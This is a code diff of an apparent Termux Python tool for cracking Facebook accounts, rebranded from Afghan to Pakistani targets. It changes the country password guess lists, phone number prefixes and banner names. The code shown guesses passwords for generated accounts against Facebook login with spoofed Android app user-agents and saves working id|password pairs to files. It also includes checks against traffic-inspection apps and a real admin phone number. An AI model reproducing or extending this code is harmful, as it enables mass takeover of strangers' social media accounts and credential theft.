@@ -212,7 +212,7 @@ def main():
                 create_file()
         elif menu_opt =='3':
                 xchker()
-                os.system('xdg-open https://github.com/Raziq-Saadat/Raziq)
+                os.system('xdg-open https://github.com/TechQaiser/Qnumber')
                 main()
         elif menu_opt =='4':
                 os.system('rm -rf fb_cookies.txt')
@@ -232,7 +232,7 @@ def main():
                 print(logo);xchker()
                 print(' Select Your Country For Best PassLists')
                 print(50*'-')
-                print('[1] AFG Ids')
+                print('[1] Pakistani Ids')
                 print('[2] Bangladesh Ids')
                 print('[3] Nigeria Ids')
                 print('[4] Other Countries')
@@ -242,19 +242,19 @@ def main():
                 if menu_opt =='1':
                         os.system('clear')
                         print(logo);xchker()
-                        print('afghan123')
-                        print('Afghanistan')
-                        print('kabul123')
-                        print('kabul1234')
+                        print('first last')
+                        print('First Last')
+                        print('firstlast')
+                        print('first123')
                         print('khan123')
-                        print('100200')
-                        print('kabul12345')
-                        print('10002000')
-                        print('20003000')
-                        print('500600')
-                        print('786786')
-                        print('khost123')
-                        print('۱۲۳۴۵۶')
+                        print('first1234')
+                        print('first12345')
+                        print('i love you')
+                        print('firstkhan')
+                        print('khankhan')
+                        print('khan12345')
+                        print('khan12')
+                        print('first786')
                         input('\nPress enter to back ')
                         main()
                 elif menu_opt =='2':
@@ -353,7 +353,7 @@ def method_crack():
         print(logo);xchker()
         print(' [1] File Cloning ')
         print(' [2] Email Cloning ')
-        print(' [3] AFG Random Cloning ')
+        print(' [3] Number Cloning ')
         print(' [0] Back')
         print(50*'-')
         clone_ = input(' Select : ')
@@ -397,7 +397,7 @@ class crack_main():
                 os.system("clear");print(logo);xchker()
                 import requests,random
                 user=[]
-                print(" [*] First Name Example Raziqullah,saadat")
+                print(" [*] First Name Example Hamza,Idrees,Rafi")
                 first = input(" First Name : ")
                 last = input(" Last Name : ")
                 print(" \n [*] Ex @gmail.com,@yahoo.com or @hotmail.com etc")
@@ -413,7 +413,7 @@ class crack_main():
         def cracknum(self,id):
                 global methods
                 os.system('clear');print(logo);xchker()
-                print('\033[0mFor Example :\033[0m 9378,9377,9379,9370 ...')
+                print('\033[0mFor Example :\033[0m 92310,92342,92300,92301 ...')
                 kode = input('\033[0mChoose Code : \033[0m')
                 print('\033[0mFor Example :\033[0m 2000,4000,6000 ...')
                 limit = int(input('\033[0mIdz Limit : \033[0m'))
@@ -427,7 +427,7 @@ class crack_main():
         def m1(self,iid,name,passlist):
                 try:
                         global ok,loop,android_models
-                        sys.stdout.write('\r[Saadat] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
+                        sys.stdout.write('\r[AFG-IDREES] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
                         fn = name.split(' ')[0]
                         try:
                                 ln = name.split(' ')[1]
@@ -440,8 +440,8 @@ class crack_main():
                                         version_,model_,brand_name_,width_,height_=infos.split('$')
                                 except:
                                         version_ = str(random.randint(7,13))
-                                        model_ = "vivo"
-                                        brand_name_ = "vivo"
+                                        model_ = "Samsung"
+                                        brand_name_ = "Samsung"
                                         width_ = "720"
                                         height_ = "1280"
                                 uas = 'Davik/2.1.0 (Linux; U; Android '+version_+'.0.0; '+model_+' Build/8BFOHT) [FBAN/FB4A;FBAV/92.866.944.616;FBPN/com.facebook.katana;FBLC/en_US;FBBV/322216925;FBCR/null;FBMF/'+brand_name_+';FBBD/'+brand_name_+';FBDV/'+brand_name_+';FBSV/'+brand_name_+'.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width='+width_+',height='+height_+'};]'
@@ -457,13 +457,13 @@ class crack_main():
                                 except:
                                         roid = iid
                                 if 'session_key' in po:
-                                        print(' \033[1;32m[Saadat-OK] '+roid+' | '+pas+'\033[0;97m')
-                                        open('/sdcard/Saadat_ok.txt','a').write(roid+'|'+pas+'\n')
+                                        print(' \033[1;32m[AFG-IDREES-OK] '+roid+' | '+pas+'\033[0;97m')
+                                        open('/sdcard/AFG-IDREES_ok.txt','a').write(roid+'|'+pas+'\n')
                                         ok.append(iid)
                                         break
                                 elif 'Please Confirm Email' in po:
-                                        print(' \033[1;32m[Saadat] '+roid+' | '+pas+'\033[0;97m')
-                                        open('/sdcard/Saadat_ok.txt','a').write(roid+'|'+pas+'\n')
+                                        print(' \033[1;32m[AFG-IDREES] '+roid+' | '+pas+'\033[0;97m')
+                                        open('/sdcard/AFG-IDREES_ok.txt','a').write(roid+'|'+pas+'\n')
                                         ok.append(iid)
                                         break
                                 else:
@@ -768,7 +768,7 @@ try:
         if f'com.h{t}pc{a}y.pro' in fileee:
                 print('error occur 0')
                 exit()
-                exit(f'\nsomethiiing went wrong\n\nContact Admin : +93702856593')
+                exit(f'\nsomethiiing went wrong\n\nContact Admin : +923197951815')
 except Exception as e:
         print(e)
         pass
@@ -780,7 +780,7 @@ except PermissionError:
 pat = os.getcwd()
 datar = []
 datar.append(pat)
-if '/data/data/com.termux/files/home/Raziq-Saadat' in datar:
+if '/data/data/com.termux/files/home/FAISAL' in datar:
         pass
 else:
         for i in range(5000):
